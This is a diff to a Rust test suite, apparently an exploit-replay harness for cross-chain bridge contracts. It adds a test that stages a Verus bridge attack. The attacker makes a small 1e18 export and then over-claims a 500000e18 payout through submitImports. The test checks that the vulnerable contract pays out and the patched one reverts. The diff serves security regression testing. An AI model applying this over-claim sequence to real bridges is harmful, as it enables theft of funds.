@@ -1567,6 +1567,36 @@ mod fixture_tests {
     }
 
     #[test]
+    fn verus_2026_official_exploit_and_patch() {
+        // Attacker makes a small, honest export (1e18) on the Verus surrogate,
+        // then over-claims a huge payout (500000e18) against that attested
+        // export. Vulnerable: checkCCEValues doesn't reconcile payout vs the
+        // committed source value -> pays out. Patched: reconciliation reverts.
+        let Some((vuln, patched)) = eval("verus", |w| {
+            let mut export_id = vec![0u8; 32];
+            export_id[31] = 0x0a;
+            let eid = Token::FixedBytes(export_id);
+            vec![
+                ucall(
+                    w,
+                    "VerusExportSurrogate",
+                    "export",
+                    vec![eid.clone(), addr_tok(attacker()), Token::Uint(parse_uint("1e18").unwrap())],
+                ),
+                ucall(
+                    w,
+                    "VerusBridge",
+                    "submitImports",
+                    vec![addr_tok(attacker()), Token::Uint(parse_uint("500000e18").unwrap()), eid],
+                ),
+            ]
+        }) else {
+            return;
+        };
+        assert_exploit("verus", &vuln, &patched);
+    }
+
+    #[test]
     fn nomad_official_exploit_and_patch() {
         let Some((vuln, patched)) = eval("nomad", |w| {
             // Attacker calls the destination release entrypoint directly with a
